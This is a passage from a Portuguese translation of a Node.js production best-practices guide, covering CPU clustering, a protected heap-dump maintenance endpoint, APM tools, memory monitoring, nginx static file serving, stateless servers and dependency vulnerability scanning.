o PM2 dentro de contêineres (principalmente a versão específica de contêineres <a href="https://www.npmjs.com/package/pm2-docker" target="_blank" rel="nofollow noopener noreferrer">pm2-docker</a>) como o primeiro nível de proteção - é muito mais rápido reiniciar um processe e fornecer recursos específicos do Node, como sinalizar ao código quando o contêiner de hospedagem solicitar a reinicialização normal. Outros podem optar por evitar camadas desnecessárias. Para concluir este artigo, nenhuma solução serve para todos eles e conhecer as opções é o mais importante.</p>
<h3>O que Outros Blogueiros Dizem</h3>
<ul>
<li>
<p>De <a href="https://expressjs.com/en/advanced/best-practice-performance.html" target="_blank" rel="nofollow noopener noreferrer">Boas Práticas em Produção do Express</a>:</p>
<blockquote>
<p>… Em desenvolvimento, você iniciou sua aplicação simplesmente a partir da linha de comando com o node server.js ou algo semelhante. <strong>Mas fazer isso na produção é uma receita para o desastre. Se o aplicativo falhar, ficará off-line</strong> até que você reinicie. Para garantir que sua aplicação seja reiniciada se ela falhar, use um gerenciador de processos. Um gerenciador de processos é um “contêiner” para aplicativos que facilitam a implementação, fornece alta disponibilidade e permite gerenciar o aplicativo em tempo de execução.</p>
</blockquote>
</li>
<li>
<p>De um post no blog Medium <a href="https://medium.com/@CodeAndBiscuits/understanding-nodejs-clustering-in-docker-land-64ce2306afef#.cssigr5z3" target="_blank" rel="nofollow noopener noreferrer">Understanding Node Clustering</a>:</p>
<blockquote>
<p>… Entendendo o Cluster de Node.js no Docker “Os contêineres do Docker são ambientes virtuais simplificados e leves, projetados para simplificar os processos ao mínimo necessário. Processos que gerenciam e coordenam seus próprios recursos não são mais valiosos. <strong>Em vez disso, as empresas de gerenciamento, como Kubernetes, Mesos e Gado, popularizaram o conceito de que esses recursos devem ser gerenciados em toda a infraestrutura.</strong> Os recursos de CPU e memória são alocados por “agendadores” e os recursos de rede são gerenciados por balanceadores de carga fornecidos pelo stack.</p>
</blockquote>
</li>
</ul>
<h2>5.6. Utilize todos os núcleos do processador</h2>
<p><strong>TL;DR:</strong> Em sua forma básica, uma aplicação Node roda em um único núcleo do processador enquanto todos os demais ficam inativos. É seu dever replicar o processamento do Node e utilizar todos os processadores. Para aplicações pequenas/médias você pode usar o Node Cluster ou PM2. Para uma aplicação maior, considere replicar o processo usando algum cluster do Docker (por exemplo, o K8S ou o ECS) ou scripts de deploy que são baseados no sistema de inicialização do Linux (por exemplo, systemd)</p>
<p><strong>Caso contrário:</strong> Sua aplicação vai utilizar apenas 25% dos recursos disponíveis(!) ou talvez até menos. Note que um servidor típico possui 4 núcleos de processamento ou mais, o deploy ingênuo do Node.js utiliza apenas 1 (mesmo usando serviços de PaaS como AWS Beanstalk!)</p>
<h1>Utilize todos os núcleos do processador</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Pode não ser uma surpresa que, em sua forma básica, o Node seja executado em um único thread = um único processo = um único CPU. Pagando por hardwares pesados ​​com 4 ou 8 CPUs e utilizando apenas um parece loucura, certo? A solução mais rápida para aplicações de tamanho médio é o uso do módulo Node’s Cluster, que em 10 linhas de código gera um processo para cada núcleo lógico e encaminha solicitações entre os processos em um estilo round-robin. Melhor ainda, use o PM2, que adoça o módulo de clustering com uma interface simples e interface de monitoramento legal. Embora essa solução funcione bem para aplicações tradicionais, ela pode ser insuficiente para aplicações que exigem desempenho de alto nível e fluxo de DevOps robusto. Para esses casos de uso avançado, considere a replicação do processo NODE usando o script de implantação e o balanceamento personalizados usando uma ferramenta especializada, como o nginx, ou use um mecanismo de contêiner como o AWS ECS ou Kubernetees que tenha recursos avançados para implantação e replicação de processos.</p>
<h3>Comparação: balanceamento usando o cluster do Node versus o nginx</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/utilizecpucores1.png?raw=true" alt="Balanceamento usando o cluster do Node versus o nginx" title="Balanceamento usando o cluster do Node versus o nginx"></p>
<h3>O que Outros Blogueiros Dizem</h3>
<ul>
<li>
<p>Da <a href="https://nodejs.org/api/cluster.html#cluster_how_it_works" target="_blank" rel="nofollow noopener noreferrer">documentação do Node.js</a>:</p>
<blockquote>
<p>… A segunda abordagem, os clusters do Node, deve, em teoria, oferecer o melhor desempenho. Na prática, no entanto, a distribuição tende a ser muito desequilibrada devido aos caprichos do planejador do sistema operacional. Cargas foram observadas onde mais de 70% de todas as conexões acabaram em apenas dois processos, de um total de oito …</p>
</blockquote>
</li>
<li>
<p>Do blog <a href="https://strongloop.com/strongblog/best-practices-for-express-in-production-part-two-performance-and-reliability/" target="_blank" rel="nofollow noopener noreferrer">StrongLoop</a>:</p>
<blockquote>
<p>… O clustering é possível com o módulo de cluster do Node. Isso permite que um processo mestre crie processos de trabalho e distribua conexões de entrada entre os trabalhadores. No entanto, em vez de usar este módulo diretamente, é muito melhor usar uma das muitas ferramentas que fazem isso por você automaticamente. por exemplo, node-pm ou cluster-service …</p>
</blockquote>
</li>
<li>
<p>Do post no Medium <a href="https://medium.com/@fermads/node-js-process-load-balancing-comparing-cluster-iptables-and-nginx-6746aaf38272" target="_blank" rel="nofollow noopener noreferrer">Desempenho do balanceamento de carga do processo Node.js: comparando módulo de cluster, iptables e Nginx</a></p>
<blockquote>
<p>… O cluster do Node é simples de implementar e configurar, as coisas são mantidas dentro do reino do Node sem depender de outro software. Lembre-se de que seu processo mestre funcionará quase tanto quanto os processos de trabalho e com uma taxa de solicitação um pouco menor do que as outras soluções. …</p>
</blockquote>
</li>
</ul>
<h2>5.7. Crie um ‘endpoint de manutenção’</h2>
<p><strong>TL;DR:</strong> Exponha um conjunto de informações relacionadas ao sistema, como uso de memória e REPL, etc, em uma API segura. Embora seja altamente recomendado confiar em ferramentas padrões e de battle-tests, algumas informações e operações valiosas são mais fáceis de serem feitas usando código.</p>
<p><strong>Caso contrário:</strong> Você perceberá que está realizando muitos “deploys de diagnóstico” - enviando código para produção apenas para extrair algumas informações para fins de diagnóstico.</p>
<h1>Crie um ‘endpoint de manutenção’</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Um endpoint de manutenção é uma API HTTP altamente seguro que faz parte do código da aplicação e sua finalidade é ser usado pela equipe de operação/produção para monitorar e expor a funcionalidade de manutenção. Por exemplo, ele pode retornar um dump de heap (instantâneo de memória) do processo, relatar se há algum vazamento de memória e até mesmo permitir executar comandos REPL diretamente. Esse endpoint é necessário onde as ferramentas DevOps convencionais (produtos de monitoramento, logs, etc) não conseguem reunir algum tipo específico de informações ou você escolhe não comprar/instalar tais ferramentas. A regra de ouro é usar ferramentas profissionais e externas para monitorar e manter a produção, que geralmente são mais robustas e precisas. Dito isso, é provável que haja casos em que as ferramentas genéricas não conseguirão extrair informações específicas do Node ou da aplicação - por exemplo, caso você deseje gerar uma snapshot da memória no momento em que o GC concluiu um ciclo - algumas bibliotecas npm executarão isso para você, mas ferramentas de monitoramento populares provavelmente perderão essa funcionalidade. É importante manter esse endpoint privado e acessível apenas por administradores, pois ele pode se tornar um alvo de um ataque DDOS.</p>
<h3>Exemplo de código: gerando um despejo de heap via código</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> heapdump <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'heapdump'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Verifique se o pedido está autorizado</span>
<span class="token keyword">function</span> <span class="token function">isAuthorized</span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// ...</span>
<span class="token punctuation">}</span>

router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/ops/heapdump'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isAuthorized</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'You are not authorized!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'Prestes a gerar o heapdump'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    heapdump<span class="token punctuation">.</span><span class="token function">writeSnapshot</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> filename</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'arquivo heapdump está pronto para ser enviado para o chamador'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
        fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Recursos Recomendados</h3>
<p><a href="http://naugtur.pl/pres3/node2prod" target="_blank" rel="nofollow noopener noreferrer">Preparando sua aplicação Node.js para produção (Slides)</a></p>
<p>▶ <a href="https://www.youtube.com/watch?v=lUsNne-_VIk" target="_blank" rel="nofollow noopener noreferrer">Preparando sua aplicação Node.js para produção (Video)</a></p>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/createmaintenanceendpoint1.png?raw=true" alt="Preparando sua aplicação Node.js para produção" title="Preparando sua aplicação Node.js para produção"></p>
<h2>5.8. Descubra erros e tempo de inatividade usando produtos APM</h2>
<p><strong>TL;DR:</strong> Produtos de monitoramento e desempenho (também conhecidos como APM) medem a base de código e a API de forma proativa para que possam ir “automagicamente” além do monitoramento tradicional e medir a experiência geral do usuário entre os serviços e camadas. Por exemplo, alguns APMs podem destacar uma transação que é carregada muito lentamente no lado do usuário final, sugerindo a causa raiz.</p>
<p><strong>Caso contrário:</strong> Você pode gastar muito esforço medindo o desempenho e os tempos de inatividade da API, provavelmente você nunca saberá quais são suas partes de código mais lentas no cenário do mundo real e como elas afetam o UX.</p>
<h1>Descubra erros e tempo de inatividade usando produtos APM</h1>
<h3>Explicação em um Parágrafo</h3>
<p>O APM (monitoramento de desempenho de aplicação) refere-se a uma família de produtos que visa monitorar o desempenho da aplicação de ponta a ponta, também da perspectiva do cliente. Enquanto as soluções de monitoramento tradicionais se concentram em exceções e métricas técnicas autônomas (por exemplo, rastreamento de erros, pontos de extremidade de servidor lentos etc.), no mundo real nossa aplicação sem exceções de código pode criar usuários decepcionados, por exemplo, se algum serviço de middleware for executado muito lentamente. Os produtos APM medem a experiência do usuário de ponta a ponta, por exemplo, dado um sistema que engloba a UI frontend e vários serviços distribuídos - alguns produtos APM podem dizer quão rápido dura uma transação que abrange vários níveis. Pode dizer se a experiência do usuário é sólida e apontar para o problema. Essa oferta atrativa vem com um preço relativamente alto, portanto, é recomendada para produtos complexos e em larga escala que exigem ir além do monitoramento direto.</p>
<h3>Exemplo de APM - um produto comercial que visualiza o desempenho de aplicações de serviço cruzado</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/apm1.png?raw=true" alt="Exemplo de APM" title="Exemplo de APM"></p>
<h3>Exemplo de APM - um produto comercial que enfatiza a pontuação da experiência do usuário</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/apm2.png?raw=true" alt="Exemplo de APM" title="Exemplo de APM"></p>
<h3>Exemplo de APM - um produto comercial que destaca caminhos de código lento</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/apm3.png?raw=true" alt="Exemplo de APM" title="Exemplo de APM"></p>
<h2>5.9. Deixe seu código pronto para produção</h2>
<p><strong>TL;DR:</strong> Programe com o fim em mente, planeje para produção desde o primeiro dia. Isso pode parecer vago, então eu compilei algumas dicas de desenvolvimento que estão relacionadas à manutenção de produção (clique no Gist abaixo).</p>
<p><strong>Caso contrário:</strong> Uma pessoa fera em TI/DevOps não salvará um sistema mal escrito.</p>
<h1>Deixe seu código pronto para produção</h1>
<h3>Explicação em um Parágrafo</h3>
<p>A seguir, uma lista de dicas de desenvolvimento que afetam significativamente a manutenção e a estabilidade da produção:</p>
<ul>
<li>O guia de doze fatores - Familiarize-se com o guia <a href="https://12factor.net/" target="_blank" rel="nofollow noopener noreferrer">Doze fatores</a></li>
<li>Seja sem estado - Não salve dados localmente em um servidor Web específico (veja o marcador separado - “Seja sem estado”)</li>
<li>Cache - Utilize o cache intensamente, mas nunca falhe por causa da incompatibilidade de cache</li>
<li>Teste de memória - calibre o uso de memória e vazamentos como parte do seu fluxo de desenvolvimento, ferramentas como “memwatch” podem facilitar muito essa tarefa</li>
<li>Funções de nome - Minimize o uso de funções anônimas (ou seja, callbacks em linha), pois um perfilador de memória típico fornecerá uso de memória por nome de função</li>
<li>Use ferramentas CI - Use ferramentas CI para detectar falhas antes de enviar para produção. Por exemplo, use o ESLint para detectar erros de referência e variáveis ​​indefinidas. Use –trace-sync-io para identificar o código que usa APIs síncronas (em vez da versão assíncrona)</li>
<li>Registre sabiamente - Inclua em cada informação contextual da declaração de log, esperançosamente no formato JSON, para que as ferramentas de agregadores de log, como o Elastic, possam pesquisar nessas propriedades (veja o marcador separado - “Aumentar a visibilidade usando logs inteligentes”). Além disso, inclua o ID da transação que identifica cada solicitação e permite correlacionar linhas que descrevem a mesma transação (veja o marcador separado - “Incluir ID da transação”)</li>
<li>Gerenciamento de erros - O tratamento de erros é o calcanhar de Aquiles dos sites de produção do Node.js - muitos processos do Node estão travando devido a pequenos erros, enquanto outros persistem em um estado defeituoso em vez de travar. Definir a sua estratégia de tratamento de erros é absolutamente essencial, leia aqui as minhas <a href="http://goldbergyoni.com/checklist-best-practices-of-node-js-error-handling/" target="_blank" rel="nofollow noopener noreferrer">práticas recomendadas de tratamento de erros</a></li>
</ul>
<h2>5.10. Meça e proteja o uso de memória</h2>
<p><strong>TL;DR:</strong> O Node.js tem uma relação controversa com o uso de memória: o motor v8 possui limites no uso de memória (1.4GB) e existem caminhos conhecidos para vazamentos de memória no código do Node - portanto, observar a memória do processo do Node é uma obrigação. Em aplicações pequenas, você pode medir a memória periodicamente usando comandos shell, mas em aplicação média-grande considere utilizar um sistema de monitoramento de memória robusto.</p>
<p><strong>Caso contrário:</strong> A memória de seus processos pode vazar cem megabytes por dia, assim como aconteceu no <a href="https://www.joyent.com/blog/walmart-node-js-memory-leak" target="_blank" rel="nofollow noopener noreferrer">Walmart</a>.</p>
<h1>Meça e proteja o uso de memória</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Em um mundo perfeito, um desenvolvedor Web não deve lidar com vazamentos de memória. Na realidade, os problemas de memória são uma pegadinha conhecida do Node. Acima de tudo, o uso da memória deve ser monitorado constantemente. Nos sites de desenvolvimento e produção pequena, você pode avaliar manualmente usando comandos do Linux ou ferramentas npm e bibliotecas como node-inspector e memwatch. A principal desvantagem dessas atividades manuais é que elas exigem que um ser humano monitore ativamente - para locais de produção sérios, é absolutamente vital usar ferramentas robustas de monitoramento, por exemplo. (AWS CloudWatch, DataDog ou qualquer sistema proativo semelhante) que alertam quando ocorre um vazamento. Existem também algumas diretrizes de desenvolvimento para evitar vazamentos: evite armazenar dados no nível global, use fluxos para dados com tamanho dinâmico, limite o escopo de variáveis ​​usando let e const.</p>
<h3>O que Outros Blogueiros Dizem</h3>
<ul>
<li>
<p>Do blog <a href="http://apmblog.dynatrace.com/" target="_blank" rel="nofollow noopener noreferrer">Dyntrace</a>:</p>
<blockquote>
<p>… ”Como já aprendemos, no Node.js o JavaScript é compilado para código nativo pelo V8. As estruturas de dados nativas resultantes não têm muito a ver com a representação original e são gerenciadas exclusivamente pelo V8. Isso significa que não podemos alocar ou desalocar ativamente a memória em JavaScript. O V8 usa um mecanismo bem conhecido chamado coleta de lixo para resolver esse problema.”</p>
</blockquote>
</li>
<li>
<p>Do blog <a href="http://blog.argteam.com/coding/hardening-node-js-for-production-part-2-using-nginx-to-avoid-node-js-load" target="_blank" rel="nofollow noopener noreferrer">Dyntrace</a>:</p>
<blockquote>
<p>… “Embora este exemplo leve a resultados óbvios, o processo é sempre o mesmo:
Crie dumps de heap com algum tempo e uma boa quantidade de alocação de memória entre
Compare alguns dumps para descobrir o que está crescendo”</p>
</blockquote>
</li>
<li>
<p>Do blog <a href="http://blog.argteam.com/coding/hardening-node-js-for-production-part-2-using-nginx-to-avoid-node-js-load" target="_blank" rel="nofollow noopener noreferrer">Dyntrace</a>:</p>
<blockquote>
<p>… “falha, o Node.js tentará usar cerca de 1,5 GB de memória, que deve ser limitado quando executado em sistemas com menos memória. Esse é o comportamento esperado, pois a coleta de lixo é uma operação muito cara.
A solução para isso foi adicionar um parâmetro extra ao processo Node.js:
node –max<em>old</em>space_size=400 server.js –production ”
“Por que a coleta de lixo é cara? O mecanismo JavaScript V8 emprega um mecanismo de coletor de lixo pare-o-mundo. Na prática, isso significa que o programa interrompe a execução enquanto a coleta de lixo está em andamento.”</p>
</blockquote>
</li>
</ul>
<h2>5.11. Deixe seus recursos de frontend fora do Node</h2>
<p><strong>TL;DR:</strong> Sirva conteúdo de frontend usando um middleware dedicado (nginx, S3, CDN) pois o desempenho do Node fica realmente prejudicado quando se lida com muitos arquivos estáticos devido ao seu modelo single threaded (segmento único).</p>
<p><strong>Caso contrário:</strong> Seu único thread do Node ficará ocupado fazendo streaming the centenas de arquivos de html/imagens/angular/react ao invés de alocar todo seu recurso para a tarefa que ele foi designado - servir conteúdo dinâmico.</p>
<h1>Deixe seus recursos de frontend fora do Node</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Em uma aplicação web clássica, o back-end serve o front-end/gráficos para o navegador, uma abordagem muito comum no mundo do Node é usar o middleware estático do Express para enviar arquivos estáticos para o cliente. MAS - O Node não é um aplicativo  Web típico, pois utiliza um único thread que não é otimizado para servir muitos arquivos de uma só vez. Em vez disso, considere o uso de um proxy reverso (por exemplo, nginx, HAProxy), armazenamento em nuvem ou CDN (por exemplo, AWS S3, Armazenamento de Blobs do Azure etc.) que utiliza muitas otimizações para essa tarefa e obtém uma taxa de transferência muito melhor. Por exemplo, um middleware especializado como o nginx incorpora ganchos diretos entre o sistema de arquivos e a placa de rede e usa uma abordagem multi-thread para minimizar a intervenção entre várias solicitações.</p>
<p>Sua solução ideal pode usar um dos seguintes formulários:</p>
<ol>
<li>Usando um proxy reverso - seus arquivos estáticos estarão localizados próximos ao seu aplicativo Node, somente os pedidos para a pasta de arquivos estáticos serão servidos por um proxy que fica na frente do seu aplicativo Node, como o nginx. Usando essa abordagem, seu aplicativo Node é responsável por implantar os arquivos estáticos, mas não para atendê-los. O colega do seu frontend vai adorar esta abordagem, pois evita solicitações de origem cruzada do frontend.</li>
<li>Armazenamento em nuvem - seus arquivos estáticos NÃO farão parte do conteúdo do aplicativo Node, eles serão carregados em serviços como o AWS S3, o Azure BlobStorage ou outros serviços semelhantes que nasceram para essa missão. Usando essa abordagem, seu aplicativo Node não é responsável por implantar os arquivos estáticos nem para atendê-los, portanto, um desacoplamento completo é desenhado entre o Node e o Frontend, que é, de qualquer maneira, manipulado por equipes diferentes.</li>
</ol>
<h3>Exemplo de configuração: configuração típica do nginx para servir arquivos estáticos</h3>
<div class="gatsby-highlight" data-language="nginx"><pre style="counter-reset: linenumber NaN" class="language-nginx line-numbers"><code class="language-nginx"><span class="token comment"># configurar compactação gzip</span>
<span class="token keyword">gzip</span> on<span class="token punctuation">;</span>
<span class="token keyword">keepalive</span> <span class="token number">64</span><span class="token punctuation">;</span>

<span class="token comment"># definindo servidor da web</span>
<span class="token keyword">server</span> <span class="token punctuation">{</span>
<span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>
<span class="token keyword">listen</span> <span class="token number">443</span> <span class="token keyword">ssl</span><span class="token punctuation">;</span>

<span class="token comment"># lidar com conteúdo estático</span>
<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">^</span><span class="token operator">/</span><span class="token punctuation">(</span>images<span class="token operator">/</span><span class="token operator">|</span>img<span class="token operator">/</span><span class="token operator">|</span>javascript<span class="token operator">/</span><span class="token operator">|</span>js<span class="token operator">/</span><span class="token operator">|</span>css<span class="token operator">/</span><span class="token operator">|</span>stylesheets<span class="token operator">/</span><span class="token operator">|</span>flash<span class="token operator">/</span><span class="token operator">|</span>media<span class="token operator">/</span><span class="token operator">|</span>static<span class="token operator">/</span><span class="token operator">|</span>robots<span class="token punctuation">.</span>txt<span class="token operator">|</span>humans<span class="token punctuation">.</span>txt<span class="token operator">|</span>favicon<span class="token punctuation">.</span>ico<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">root</span> <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>silly_face_society<span class="token operator">/</span>node<span class="token operator">/</span>public<span class="token punctuation">;</span>
<span class="token keyword">access_log</span> off<span class="token punctuation">;</span>
<span class="token keyword">expires</span> max<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do blog <a href="https://strongloop.com/strongblog/best-practices-for-express-in-production-part-two-performance-and-reliability/" target="_blank" rel="nofollow noopener noreferrer">StrongLoop</a>:</p>
<blockquote>
<p>…Em desenvolvimento, você pode usar <a href="http://expressjs.com/4x/api.html#res.sendFile" target="_blank" rel="nofollow noopener noreferrer">res.sendFile()</a> para servir arquivos estáticos. Mas não faça isso em produção, porque essa função precisa ser lida no sistema de arquivos para cada solicitação de arquivo. Por isso, ela terá latência significativa e afetará o desempenho geral do aplicativo. Note que res.sendFile() não é implementado com a chamada do sistema sendfile, o que tornaria muito mais eficiente. Em vez disso, use o middleware static-service (ou algo equivalente), que é otimizado para servir arquivos para aplicativos Express. Uma opção ainda melhor é usar um proxy reverso para servir arquivos estáticos; consulte Usar um proxy reverso para obter mais informações…</p>
</blockquote>
<h2>5.12. Seja stateless, mate seus Servidores quase todos os dias</h2>
<p><strong>TL;DR:</strong> Armazene qualquer tipo de dados (por exemplo, sessões de usuário, cache, arquivos de upload) em armazenamentos externos. Considere ‘matar’ seus servidores periódicamente ou utilize plataformas ‘serverless’ (por exemplo, AWS Lambda) que forçam explicitamente um comportamento stateless.</p>
<p><strong>Caso contrário:</strong> Falha em um determinado servidor resultará em tempo de inatividade da aplicação, em vez de apenas matar uma máquina defeituosa. Além do mais, dimensionar a elasticidade será mais desafiador devido à dependência de um servidor específico.</p>
<h1>Seja stateless, mate seus Servidores quase todos os dias</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Você já encontrou um problema de produção grave no qual um servidor estava com alguma configuração ou dados em falta? Isso provavelmente se deve a alguma dependência desnecessária de algum ativo local que não faz parte da implantação. Muitos produtos de sucesso tratam servidores como um pássaro fênix - ele morre e renasce periodicamente sem nenhum dano. Em outras palavras, um servidor é apenas uma peça de hardware que executa seu código por algum tempo e é substituído depois disso.
Essa abordagem</p>
<ul>
<li>permite dimensionamento adicionando e removendo servidores dinamicamente sem efeitos colaterais.</li>
<li>simplifica a manutenção, pois libera nossa mente de avaliar cada estado do servidor.</li>
</ul>
<h3>Exemplo de código: anti-padrões</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Erro típico 1: salvar arquivos enviados, localmente em um servidor</span>
<span class="token keyword">var</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// middleware express para lidar com uploads de várias partes</span>
<span class="token keyword">var</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">{</span> dest<span class="token operator">:</span> <span class="token string">'uploads/'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/photos/upload'</span><span class="token punctuation">,</span> upload<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'photos'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Erro típico 2: armazenar sessões de autenticação (passport) em um arquivo local ou memória</span>
<span class="token keyword">var</span> FileStore <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'session-file-store'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    store<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">FileStore</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">,</span>
    secret<span class="token operator">:</span> <span class="token string">'keyboard cat'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Erro típico 3: armazenar informações no objeto global</span>
Global<span class="token punctuation">.</span>someCacheLike<span class="token punctuation">.</span>result <span class="token operator">=</span> <span class="token punctuation">{</span> somedata <span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do blog <a href="https://martinfowler.com/bliki/PhoenixServer.html" target="_blank" rel="nofollow noopener noreferrer">Martin Fowler</a>:</p>
<blockquote>
<p>…Um dia tive essa fantasia de iniciar um serviço de certificação para operações. A avaliação da certificação consistiria em um colega e eu aparecendo no data center corporativo e atacar os servidores de produção críticos com um taco de beisebol, uma motosserra e uma pistola de água. A avaliação seria baseada em quanto tempo levaria para a equipe de operações colocar todas as aplicações em funcionamento novamente. Esta pode ser uma fantasia idiota, mas há um pouco de sabedoria aqui. Enquanto você não deve usar os bastões de beisebol, é uma boa idéia queimar seus servidores em intervalos regulares. Um servidor deve ser como uma fênix, subindo regularmente das cinzas…</p>
</blockquote>
<h2>5.13. Utilize ferramentas que detectam vulnerabilidades automaticamente</h2>
<p><strong>TL;DR:</strong> Mesmo as dependências mais confiáveis, como o Express, têm vulnerabilidades conhecidas (de tempos em tempos) que podem colocar um sistema em risco. Isso pode ser contornado usando ferramentas comunitárias e comerciais que constantemente verificam vulnerabilidades e avisam (localmente ou no Github). Algumas podem até corrigí-las imediatamente.</p>
<p><strong>Caso contrário:</strong> Manter seu código limpo com vulnerabilidades sem ferramentas dedicadas exigirá o acompanhamento constante de publicações online sobre novas ameaças. Bem entendiante.</p>
<h1>Utilize ferramentas que detectam vulnerabilidades automaticamente</h1>
<h3>Explicação em um Parágrafo</h3>
<p>As aplicações modernas de Node possuem dezenas e algumas vezes centenas de dependências. Se alguma das dependências que você usa tiver uma vulnerabilidade de segurança conhecida, seu aplicativo também estará vulnerável.
As ferramentas a seguir verificam automaticamente vulnerabilidades de segurança conhecidas em suas dependências:</p>
<ul>
<li><a href="https://docs.npmjs.com/cli/audit" target="_blank" rel="nofollow noopener noreferrer">npm audit</a> - npm audit</li>
<li><a href="https://snyk.io/" target="_blank" rel="nofollow noopener noreferrer">snyk</a> - Encontre e corrija continuamente vulnerabilidades em suas dependências</li>
</ul>
<h3>O que Outros Blogueiros dizem</h3>
<p>Do blog <a href="https://strongloop.com/strongblog/best-practices-for-express-in-production-part-one-security/" target="_blank" rel="nofollow noopener noreferrer">StrongLoop</a>:</p>
<blockquote>
